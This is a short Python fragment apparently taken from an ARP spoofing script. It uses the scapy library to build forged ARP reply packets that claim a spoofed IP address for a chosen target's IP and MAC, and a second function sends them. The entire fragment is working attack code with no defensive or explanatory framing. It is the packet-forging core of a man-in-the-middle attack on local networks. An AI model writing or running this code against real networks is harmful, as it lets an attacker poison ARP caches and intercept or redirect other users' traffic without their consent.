import scapy.all as scapy
def create_packet(target_ip, target_mac, spoof_ip):
    packet = scapy.ARP(op=2, pdst = target_ip, hwdst=target_mac, psrc = spoof_ip)
    return packet
def send_packet(packet):
    scapy.send(packet)